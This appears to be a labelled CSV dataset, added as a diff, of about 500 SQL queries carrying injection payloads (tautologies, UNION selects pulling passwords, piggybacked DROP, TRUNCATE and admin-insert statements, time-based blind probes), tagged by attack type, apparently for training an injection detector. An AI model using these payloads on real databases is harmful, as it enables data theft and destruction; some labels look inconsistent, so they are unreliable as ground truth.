@@ -1,0 +1,501 @@
+SQL Query,Illegal/Logically Incorrect Query,PiggyBacked Query,Union Query
+"SELECT * FROM profiles WHERE ID = ''union select all 1,2,x,x,x,x --'",1,0,1
+SELECT * from username where type = ' a' or 'a' = 'a',1,0,0
+SELECT * FROM users WHERE name=' a' or 1=1--' and password='',1,0,0
+SELECT * FROM product WHERE PCategory=''',1,0,0
+SELECT * FROM students WHERE username = ' '' ' AND password = '',1,0,0
+SELECT * from test.members where user_name=' \\'; DESC users; -- ' and password='';,1,1,0
+SELECT * FROM students WHERE username = ' ' or 'x'='x' AND password = '',1,0,0
+"SELECT * FROM newsletter WHERE email = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
+SELECT id FROM Users WHERE username = ' ' or 'a'='a',1,0,0
+"SELECT * FROM custTable WHERE User=''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students(StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--' OR 1=1'-- AND Pass=?",1,1,0
+SELECT * FROM customers WHERE username = ''; TRUNCATE TABLE Username; --' and password = '',1,1,0
+SELECT * FROM custTable WHERE User=' ' or 0=0 --' OR 1=1'-- AND Pass=?,1,0,0
+SELECT * from username where type = ''; TRUNCATE TABLE Username; --',1,1,0
+SELECT data FROM table WHERE Emailinput = ' 'sqlvuln',1,0,0
+SELECT * FROM customers WHERE username = ' ' or 0=0 --' and password = '',1,0,0
+SELECT * FROM users WHERE name='' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1' and password='',1,0,0
+SELECT * FROM newsletter WHERE email = ''; DROP table Username --',1,1,0
+SELECT * FROM profiles WHERE ID = ' ' or 'a'='a',1,0,0
+SELECT * FROM users WHERE name=''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--' and password='',1,1,0
+"SELECT user_name,password from test.members where user_name= ' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- '",1,0,0
+SELECT * from user where id =''; DROP table Username --',1,1,0
+SELECT data FROM table WHERE Emailinput = '' union select password from users --',1,0,1
+SELECT * from username where type = ' '%31%27%20%4F%52%20%27%31%27%3D%27%31',1,0,0
+SELECT * from test.members where user_name='' union select password from users --' and password='';,1,1,1
+"SELECT * FROM customers WHERE username = ' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- ' and password = ''",1,0,0
+"SELECT * from test.members where user_name='ddd' union select username,password from students --'",1,0,1
+SELECT * from user where id =' a' or 'a' = 'a',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ''; INSERT into Username (username, password, user_type) value('admin2', 'admin2', '1'); --' ORDER BY 'id' DESC LIMIT 0,3",1,1,0
+SELECT * FROM profiles WHERE ID = ' a' or 'a' = 'a',1,0,0
+SELECT * from table where username = ' 1' AND non_existant_table = '1 ' and password = '',1,0,0
+SELECT * FROM product WHERE PCategory=' '' ',1,0,0
+SELECT * FROM users WHERE username = ' ' 1 AND 1=1-- ',1,0,0
+SELECT * FROM profiles WHERE ID = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ',1,1,0
+"SELECT user_name,password from test.members where user_name= ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
+SELECT * FROM students WHERE username = ''' AND password = '',1,0,0
+"SELECT * from table where username = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/' and password = ''",1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' a' or 'a' = 'a' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+"SELECT data FROM table WHERE Emailinput = ''union select all 1,2,x,x,x,x --'",1,0,1
+SELECT * FROM custTable WHERE User=' ' 1 OR 1=1-- ' OR 1=1'-- AND Pass=?,1,0,0
+"SELECT * FROM newsletter WHERE email = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
+SELECT * FROM profiles WHERE ID = ''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--',1,1,0
+"SELECT user_name,password from test.members where user_name= ' a' or 'a' = 'a'",1,0,0
+SELECT * from username where type = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ',1,1,0
+"SELECT * from test.members where user_name='""""' and password='';",1,1,0
+"SELECT * FROM students WHERE username = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--' AND password = ''",1,1,0
+"SELECT email from users where email = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
+SELECT * FROM custTable WHERE User='ddd' group by (studentid)--' OR 1=1'-- AND Pass=?,1,0,0
+SELECT * from table where username = ' \\'; DESC users; -- ' and password = '',1,1,0
+"SELECT 1,2, ' or a=a-- FROM some_table WHERE ex = ample",1,0,0
+"SELECT * FROM custTable WHERE User='ddd' union select username,password from students --' OR 1=1'-- AND Pass=?",1,0,1
+"SELECT 1,2, IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/ FROM some_table WHERE ex = ample",1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' \\'; DESC users; -- ' ORDER BY 'id' DESC LIMIT 0,3",1,1,0
+"SELECT * FROM custTable WHERE User=''ddd""""' OR 1=1'-- AND Pass=?",1,0,0
+SELECT * FROM custTable WHERE User=''' OR 1=1'-- AND Pass=?,1,0,0
+SELECT data FROM table WHERE Emailinput = ' \\'; DESC users; -- ',1,1,0
+SELECT * FROM students WHERE username = ' ' or 1=1--' AND password = '',1,0,0
+SELECT * FROM users WHERE username = ' hi' or 1=1 --',1,0,0
+"SELECT * FROM students WHERE username = ''; INSERT into Username (username, password, user_type) value('admin2', 'admin2', '1'); --' AND password = ''",1,1,0
+SELECT * FROM users WHERE username = ' ' or 1 EXEC XP_ ',1,0,0
+SELECT * FROM newsletter WHERE email = '' union select password from users where name = 'Robin' --',1,0,1
+SELECT * FROM some_table WHERE double_quotes = ' ' OR username IS NOT NULL OR username = ' ',1,0,0
+SELECT * FROM customers WHERE username = 'ddd' group by (studentid)--' and password = '',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ' ORDER BY 'id' DESC LIMIT 0,3",1,1,0
+SELECT * FROM product WHERE PCategory=' hi' or 1=1 --',1,0,0
+SELECT * FROM newsletter WHERE email = 'ddd' group by (studentid)--',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' ' or a=a--' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT * FROM customers WHERE username = ' 1\\'1-- ' and password = '',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' 1\\'1-- ' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT * FROM newsletter WHERE email = ' 1\\'1-- ',1,0,0
+SELECT * FROM profiles WHERE ID = ' '' ',1,0,0
+"SELECT * FROM users WHERE name=''; INSERT into Username (username, password, user_type) value('admin2', 'admin2', '1'); --' and password=''",1,1,0
+"SELECT 1,2, ddd' union select username from students -- FROM some_table WHERE ex = ample",1,0,1
+"SELECT * FROM some_table WHERE double_quotes = ''union select all 1,2,x,x,x,x --'",1,0,1
+"SELECT email from users where email = ''ddd""""'",1,0,0
+"SELECT 1,2, ' union select password from users -- FROM some_table WHERE ex = ample",1,0,1
+"SELECT 1,2, ' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' -- FROM some_table WHERE ex = ample",1,0,1
+SELECT id FROM Users WHERE username = ' '%31%27%20%4F%52%20%27%31%27%3D%27%31',1,0,0
+"SELECT user_name,password from test.members where user_name= 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
+SELECT * FROM customers WHERE username = ''; DROP table Username --' and password = '',1,1,0
+SELECT email from users where email = ' ' or 1 EXEC XP_ ',1,0,0
+SELECT * FROM profiles WHERE ID = ' ' or 1=1--',1,0,0
+SELECT * from username where type = 'ddd' group by (studentid)--',1,0,0
+SELECT * FROM users WHERE name=' ' or 'a'='a' and password='',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' ' or 1 EXEC XP_ ' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT * from test.members where user_name=' ' 1 AND 1=1-- ' and password='';,1,1,0
+"SELECT user_name,password from test.members where user_name= ' ' or 1 EXEC XP_ '",1,0,0
+SELECT email from users where email = ' hi' or 1=1 --',1,0,0
+SELECT * FROM students WHERE username = ' a' or 'a' = 'a' AND password = '',1,0,0
+"SELECT * from test.members where user_name=''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
+"SELECT * FROM product WHERE PCategory='""""'",1,0,0
+SELECT email from users where email = ' ' or 'a'='a',1,0,0
+SELECT * FROM users WHERE username = 'ddd' union select username from students --',1,0,1
+"SELECT * FROM users WHERE name='ddd' union select username,password from students --' and password=''",1,0,1
+"SELECT * FROM product WHERE PCategory=' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
+"SELECT * FROM 'news' WHERE 'id' = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT * FROM students WHERE username = ' ' OR 1=1-- ' AND password = '',1,0,0
+SELECT data FROM table WHERE Emailinput = 'ddd' compute sum(username)--',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' ' or 'a'='a' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+"SELECT user_name,password from test.members where user_name= ' ' or a=a--'",1,0,0
+SELECT * FROM students WHERE username = ' a' waitfor delay '0:0:10'--' AND password = '',1,0,0
+SELECT id FROM Users WHERE username = ' ' 1 AND 1=1-- ',1,0,0
+SELECT * from test.members where user_name='ddd' union select username from students --' and password='';,1,1,1
+SELECT * FROM customers WHERE username = 'ddd' union select username from students --' and password = '',1,0,1
+SELECT * FROM some_table WHERE double_quotes = ' ' or 'a'='a',1,0,0
+"SELECT * from username where type = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
+SELECT * from test.members where user_name='' union select password from users where name = 'Robin' --',1,0,1
+SELECT * FROM customers WHERE username = ' ' OR username IS NOT NULL OR username = ' ' and password = '',1,0,0
+"SELECT user_name,password from test.members where user_name= ' a' or 1=1--'",1,0,0
+"SELECT * FROM custTable WHERE User='IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/' OR 1=1'-- AND Pass=?",1,0,0
+SELECT * FROM students WHERE username = '' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1' AND password = '',1,0,0
+"SELECT * FROM users WHERE username = ''union select all 1,2,x,x,x,x --'",1,0,1
+"SELECT * FROM product WHERE PCategory=''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
+"SELECT * from table where username = ''union select 1,2,3,x,x,x,x,@@version,x--' and password = ''",1,0,1
+"SELECT user_name,password from test.members where user_name= ''union select all 1,2,x,x,x,x --'",1,0,1
+SELECT data FROM table WHERE Emailinput = ' a' or 1=1--',1,0,0
+SELECT * FROM users WHERE name=' 'sqlvuln' and password='',1,0,0
+SELECT * FROM customers WHERE username = ' ' OR 1=1-- ' and password = '',1,0,0
+SELECT email from users where email = '' union select password from users --',1,0,1
+SELECT * FROM profiles WHERE ID = ''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--',1,1,0
+SELECT * FROM users WHERE name=' admin'-- ' and password='',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' ' or 'x'='x' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT * FROM students WHERE username = ' ' or a=a--' AND password = '',1,0,0
+SELECT * from user where id =' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ',1,1,0
+SELECT * FROM newsletter WHERE email = ' a' or 'a' = 'a',1,0,0
+SELECT * from username where type = '' union select password from users where name = 'Robin' --',1,0,1
+"SELECT data FROM table WHERE Emailinput = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
+SELECT * FROM students WHERE username = ' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ' AND password = '',1,1,0
+"SELECT * FROM students WHERE username = ''union select 1,2,3,x,x,x,x,@@version,x--' AND password = ''",1,0,1
+SELECT * FROM profiles WHERE ID = ' ' or 'x'='x',1,0,0
+SELECT * FROM users WHERE username = ' ' OR username IS NOT NULL OR username = ' ',1,0,0
+SELECT * FROM custTable WHERE User=''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--' OR 1=1'-- AND Pass=?,1,1,0
+"SELECT * FROM 'news' WHERE 'id' = ' ' or 1=1--' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT email from users where email = ' ' OR 1=1-- ',1,0,0
+SELECT * from test.members where user_name=' ' OR username IS NOT NULL OR username = ' ',1,0,0
+SELECT * FROM users WHERE username = ' ' or 0=0 --',1,0,0
+SELECT id FROM Users WHERE username = ' 1' AND non_existant_table = '1 ',0,0,0
+"SELECT id FROM Users WHERE username = ''union select all 1,2,x,x,x,x --'",1,0,1
+SELECT * FROM customers WHERE username = ''' and password = '',1,0,0
+"SELECT * FROM some_table WHERE double_quotes = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
+"SELECT * from username where type = 'ddd' union select username,password from students --'",1,0,1
+"SELECT * FROM 'news' WHERE 'id' = ' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- ' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+"SELECT * from user where id ='ddd' union select username,password from students --'",1,0,1
+SELECT * FROM customers WHERE username = ' '%31%27%20%4F%52%20%27%31%27%3D%27%31' and password = '',1,0,0
+SELECT * FROM product WHERE PCategory=' '%31%27%20%4F%52%20%27%31%27%3D%27%31',1,0,0
+"SELECT * FROM custTable WHERE User=' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- ' OR 1=1'-- AND Pass=?",1,0,0
+SELECT * from table where username = ' '' ' and password = '',1,0,0
+SELECT * FROM customers WHERE username = '' union select password from users --' and password = '',1,0,1
+SELECT * from username where type = ' ' OR 1=1-- ',1,0,0
+SELECT * FROM customers WHERE username = ' ' or a=a--' and password = '',1,0,0
+SELECT * FROM some_table WHERE double_quotes = ' 1\\'1-- ',1,0,0
+SELECT * FROM profiles WHERE ID = '' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1',1,0,0
+SELECT email from users where email = ''',1,0,0
+"SELECT * FROM users WHERE username = ''union select 1,2,3,x,x,x,x,@@version,x--'",1,0,1
+SELECT * FROM some_table WHERE double_quotes = ' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ',1,1,0
+SELECT * from table where username = ''; TRUNCATE TABLE Username; --' and password = '',1,1,0
+"SELECT * from user where id =''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
+"SELECT * from test.members where user_name=''union select 1,2,3,x,x,x,x,@@version,x--'",1,0,1
+SELECT * FROM students WHERE username = '' union select password from users where name = 'Robin' --' AND password = '',1,0,1
+"SELECT * FROM profiles WHERE ID = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
+"SELECT * FROM profiles WHERE ID = ''; INSERT into Username (username, password, user_type) value('admin2', 'admin2', '1'); --'",1,1,0
+SELECT email from users where email = '' union select password from users where name = 'Robin' --',1,0,1
+"SELECT * FROM some_table WHERE double_quotes = ' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- '",1,0,0
+"SELECT id FROM Users WHERE username = '""""'",1,0,0
+SELECT * FROM users WHERE name=''; TRUNCATE TABLE Username; --' and password='',1,1,0
+"SELECT email from users where email = ''union select 1,2,3,x,x,x,x,@@version,x--'",1,0,1
+"SELECT 1,2, ' OR username IS NOT NULL OR username = ' FROM some_table WHERE ex = ample",0,0,0
+SELECT data FROM table WHERE Emailinput = ' ' 1 OR 1=1-- ',1,0,0
+SELECT * FROM some_table WHERE double_quotes = ' '' ',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ''union select 1,2,3,x,x,x,x,@@version,x--' ORDER BY 'id' DESC LIMIT 0,3",1,0,1
+"SELECT id FROM Users WHERE username = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
+SELECT * FROM users WHERE name=' ' or 1=1--' and password='',1,0,0
+SELECT * FROM product WHERE PCategory='ddd' union select username from students --',1,0,1
+SELECT * FROM some_table WHERE double_quotes = '' union select password from users --',1,0,1
+"SELECT user_name,password from test.members where user_name= '' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1'",1,0,0
+"SELECT user_name,password from test.members where user_name= ''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--'",1,1,0
+SELECT * FROM users WHERE username = 'ddd' compute sum(username)--',1,0,0
+SELECT * from table where username = '' union select password from users --' and password = '',1,0,1
+"SELECT * FROM customers WHERE username = '' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --' and password = ''",1,0,1
+SELECT * FROM customers WHERE username = ''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--' and password = '',1,1,0
+SELECT * FROM users WHERE username = '' union select password from users where name = 'Robin' --',1,0,1
+SELECT email from users where email = ' ' OR username IS NOT NULL OR username = ' ',1,0,0
+SELECT * from username where type = ' ' or 1 UNION SELECT ALL FROM WHERE--',1,0,1
+SELECT * FROM profiles WHERE ID = ''; DROP table Username --',1,1,0
+SELECT * FROM customers WHERE username = '' union select password from users where name = 'Robin' --' and password = '',1,0,1
+SELECT id FROM Users WHERE username = ' 'sqlvuln',1,0,0
+"SELECT * from user where id =''union select 1,2,3,x,x,x,x,@@version,x--'",1,0,1
+SELECT * from test.members where user_name='ddd' compute sum(username)--',1,0,0
+SELECT * FROM custTable WHERE User='' union select password from users --' OR 1=1'-- AND Pass=?,1,0,1
+SELECT data FROM table WHERE Emailinput = ' a' waitfor delay '0:0:10'--',1,0,0
+SELECT * FROM product WHERE PCategory=' ' or a=a--',1,0,0
+SELECT data FROM table WHERE Emailinput = 'ddd' union select username from students --',1,0,1
+SELECT * FROM profiles WHERE ID = 'ddd' group by (studentid)--',1,0,0
+"SELECT user_name,password from test.members where user_name= ' 'sqlvuln'",1,0,0
+"SELECT 1,2, a' or 'a' = 'a FROM some_table WHERE ex = ample",0,0,0
+SELECT email from users where email = 'ddd' group by (studentid)--',1,0,0
+"SELECT * FROM users WHERE name='IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/' and password=''",1,0,0
+SELECT * from test.members where user_name=' ' or 1=1--' and password='';,1,1,0
+"SELECT 1,2, ' 1 AND 1=1-- FROM some_table WHERE ex = ample",1,0,0
+SELECT * from user where id =' 1 AND USER_NAME() = \'dbo\'-- ',1,0,0
+"SELECT * FROM some_table WHERE double_quotes = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
+SELECT * FROM some_table WHERE double_quotes = ' 1 AND USER_NAME() = \'dbo\'-- ',1,0,0
+SELECT * FROM customers WHERE username = 'ddd' compute sum(username)--' and password = '',1,0,0
+SELECT id FROM Users WHERE username = ' ' OR username IS NOT NULL OR username = ' ',1,0,0
+SELECT * FROM some_table WHERE double_quotes = ' ' or a=a--',1,0,0
+"SELECT * from table where username = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--' and password = ''",1,1,0
+"SELECT 1,2, IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/ FROM some_table WHERE ex = ample",1,0,0
+SELECT * FROM profiles WHERE ID = 'ddd' union select username from students --',1,0,1
+SELECT * from test.members where user_name='ddd' union select username from students --',1,0,1
+SELECT * FROM students WHERE username = ' ' OR username IS NOT NULL OR username = ' ' AND password = '',1,0,0
+SELECT * FROM custTable WHERE User='ddd' group by (password)--' OR 1=1'-- AND Pass=?,1,0,0
+"SELECT 1,2, ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- FROM some_table WHERE ex = ample",1,0,1
+SELECT data FROM table WHERE Emailinput = ' admin'-- ',1,0,0
+SELECT id FROM Users WHERE username = ' \\'; DESC users; -- ',1,1,0
+SELECT * FROM users WHERE username = 'ddd' group by (password)--',1,0,0
+SELECT * from test.members where user_name=''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--' and password='';,1,1,0
+"SELECT 1,2, 1 AND USER_NAME() = \'dbo\'-- FROM some_table WHERE ex = ample",1,0,0
+SELECT * FROM newsletter WHERE email = ''; TRUNCATE TABLE Username; --',1,1,0
+SELECT * from username where type = ' ' or a=a--',1,0,0
+SELECT data FROM table WHERE Emailinput = ' ' or 1 UNION SELECT ALL FROM WHERE--',1,0,1
+SELECT * FROM custTable WHERE User=' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ' OR 1=1'-- AND Pass=?,1,1,0
+SELECT * from username where type = ' hi' or 1=1 --',1,0,0
+SELECT * from user where id =' hi' or 1=1 --',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ''' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT * from user where id =' '%31%27%20%4F%52%20%27%31%27%3D%27%31',1,0,0
+SELECT * FROM product WHERE PCategory='ddd' compute sum(username)--',1,0,0
+"SELECT * FROM custTable WHERE User='' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --' OR 1=1'-- AND Pass=?",1,0,1
+"SELECT * FROM 'news' WHERE 'id' = ' ' or 0=0 --' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT * from test.members where user_name=' ' 1 OR 1=1-- ',1,0,0
+SELECT id FROM Users WHERE username = ''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--',1,1,0
+SELECT * from test.members where user_name='ddd' group by (password)--' and password='';,1,1,0
+SELECT email from users where email = ' ' or 0=0 #',1,0,0
+SELECT data FROM table WHERE Emailinput = ''; TRUNCATE TABLE Username; --',1,1,0
+SELECT * from test.members where user_name=' ' or 'a'='a',1,0,0
+SELECT * FROM users WHERE username = ' 1\\'1-- ',1,0,0
+SELECT * FROM newsletter WHERE email = ''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--',1,1,0
+SELECT id FROM Users WHERE username = ' a' or 'a' = 'a',1,0,0
+SELECT id FROM Users WHERE username = ' ' or 0=0 #',1,0,0
+"SELECT email from users where email = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
+"SELECT user_name,password from test.members where user_name= '' union select password from users where name = 'Robin' --'",1,0,1
+SELECT * from test.members where user_name=' \\'; DESC users; -- ',1,1,0
+SELECT * from test.members where user_name='ddd' group by (password)--',1,0,0
+SELECT data FROM table WHERE Emailinput = ' ' OR 1=1-- ',1,0,0
+SELECT * from test.members where user_name=' '%31%27%20%4F%52%20%27%31%27%3D%27%31',1,0,0
+"SELECT * from test.members where user_name=' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- '",1,0,0
+SELECT * FROM users WHERE name=' ' or 0=0 #' and password='',1,0,0
+"SELECT 1,2, '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- FROM some_table WHERE ex = ample",1,1,0
+SELECT * FROM profiles WHERE ID = ''',1,0,0
+SELECT * from test.members where user_name=''; TRUNCATE TABLE Username; --' and password='';,1,1,0
+"SELECT user_name,password from test.members where user_name= '""'",1,0,0
+SELECT * from table where username = ' ' OR username IS NOT NULL OR username = ' ' and password = '',1,0,0
+SELECT * FROM product WHERE PCategory=' ' or 1 UNION SELECT ALL FROM WHERE--',1,0,1
+SELECT * from user where id =' ' or 1 EXEC XP_ ',1,0,0
+"SELECT * FROM students WHERE username = ' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- ' AND password = ''",1,0,0
+SELECT * FROM users WHERE name=''; DROP table Username --' and password='',1,1,0
+SELECT * from test.members where user_name='' union select password from users where name = 'Robin' --' and password='';,1,1,1
+"SELECT * FROM users WHERE username = 'ddd' union select username,password from students --'",1,0,1
